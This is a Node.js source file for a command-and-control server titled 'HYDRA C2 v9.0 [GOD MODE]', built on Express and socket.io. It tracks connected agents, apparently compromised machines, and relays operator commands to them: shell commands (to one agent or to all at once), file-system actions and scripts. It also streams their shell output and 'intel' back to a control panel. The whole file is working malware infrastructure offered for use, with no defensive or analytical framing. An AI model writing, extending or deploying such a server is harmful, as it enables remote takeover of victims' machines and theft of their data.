const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

app.get('/', (req, res) => { res.send('HYDRA C2 v9.0 [GOD MODE]'); });

const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

let agents = []; 

io.on('connection', (socket) => {
    socket.on('identify', (data) => {
        if (data.type === 'ui') {
            socket.join('ui_room');
            socket.emit('agents_list', agents);
        } else {
            const existing = agents.find(a => a.id === data.id);
            if (existing) { existing.socketId = socket.id; existing.status = 'Online'; }
            else { agents.push({ ...data, socketId: socket.id, status: 'Online', lastSeen: Date.now() }); }
            io.to('ui_room').emit('agents_list', agents);
        }
    });

    socket.on('heartbeat', (data) => {
        const agent = agents.find(a => a.id === data.id);
        if (agent) { agent.lastSeen = Date.now(); agent.status = 'Online'; }
    });

    // ROUTING: UI -> AGENT
    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        const target = agents.find(a => a.id === targetId);
        if (targetId === 'all') io.emit('exec', { cmd });
        else if (target) io.to(target.socketId).emit('exec', { cmd });
    });

    socket.on('exec_fs', (data) => {
        const { targetId, ...payload } = data;
        const target = agents.find(a => a.id === targetId);
        if (target) io.to(target.socketId).emit('exec_fs', payload);
    });

    socket.on('exec_script', (data) => {
        const { targetId, ...payload } = data;
        const target = agents.find(a => a.id === targetId);
        if (target) io.to(target.socketId).emit('exec_script', payload);
    });

    // ROUTING: AGENT -> UI
    socket.on('stream_log', (data) => {
        io.to('ui_room').emit('agent_event', { 
            type: 'SHELL_OUTPUT', 
            agentId: data.from, 
            payload: data.output,
            isIntel: data.isIntel || false
        });
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if (agent) { agent.status = 'Offline'; io.to('ui_room').emit('agents_list', agents); }
    });
});

server.listen(process.env.PORT || 3000, () => console.log('HYDRA C2 LISTENING (v9)'));
